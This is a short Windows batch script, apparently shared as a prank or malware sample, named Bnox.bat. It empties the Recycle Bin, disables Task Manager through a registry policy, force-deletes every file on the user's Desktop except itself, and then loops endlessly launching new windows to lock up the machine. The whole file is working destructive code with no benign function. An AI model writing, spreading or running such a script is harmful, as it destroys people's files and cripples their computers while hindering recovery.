@echo off
echo created by cyber nerd github
PowerShell.exe -NoProfile -Command "Clear-RecycleBin -Force"
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
set "desktop=%USERPROFILE%\Desktop"
set "preserve_file=Bnox.bat"

for %%f in ("%desktop%\*") do (
    if /i not "%%~nxf"=="%preserve_file%" (
        del /f /q "%%f"
    )
)
:loop
set desktop_path=%USERPROFILE%\Desktop\Bnox%random%.txt
start
goto loop
